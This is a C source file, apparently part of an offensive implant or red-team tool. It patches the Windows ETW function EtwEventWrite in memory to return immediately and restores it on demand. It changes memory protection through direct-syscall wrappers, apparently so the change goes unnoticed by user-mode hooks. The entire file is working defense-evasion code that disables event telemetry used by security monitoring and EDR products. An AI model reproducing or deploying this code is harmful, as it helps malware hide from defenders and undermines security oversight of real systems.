#include "EtwPatch.h"
#include "Syscalls.h"

static BYTE  g_etwOrigBytes[2];
static PVOID g_pEtwEventWrite = NULL;
static BOOL  g_etwPatched = FALSE;

void EtwPatch()
{
    if (g_etwPatched)
        return;

    g_pEtwEventWrite = ApiNt->EtwEventWrite;
    if (!g_pEtwEventWrite)
        return;

    memcpy(g_etwOrigBytes, g_pEtwEventWrite, sizeof(g_etwOrigBytes));

    PVOID  addr = g_pEtwEventWrite;
    SIZE_T size = sizeof(g_etwOrigBytes);
    ULONG  oldProtect = 0;
    SysNtProtectVirtualMemory(NtCurrentProcess(), &addr, &size, PAGE_READWRITE, &oldProtect);

    *(BYTE*)g_pEtwEventWrite = 0xC3;

    addr = g_pEtwEventWrite;
    size = sizeof(g_etwOrigBytes);
    SysNtProtectVirtualMemory(NtCurrentProcess(), &addr, &size, oldProtect, &oldProtect);

    g_etwPatched = TRUE;
}

void EtwRestore()
{
    if (!g_etwPatched || !g_pEtwEventWrite)
        return;

    PVOID  addr = g_pEtwEventWrite;
    SIZE_T size = sizeof(g_etwOrigBytes);
    ULONG  oldProtect = 0;
    SysNtProtectVirtualMemory(NtCurrentProcess(), &addr, &size, PAGE_READWRITE, &oldProtect);

    memcpy(g_pEtwEventWrite, g_etwOrigBytes, sizeof(g_etwOrigBytes));

    addr = g_pEtwEventWrite;
    size = sizeof(g_etwOrigBytes);
    SysNtProtectVirtualMemory(NtCurrentProcess(), &addr, &size, oldProtect, &oldProtect);

    g_etwPatched = FALSE;
}
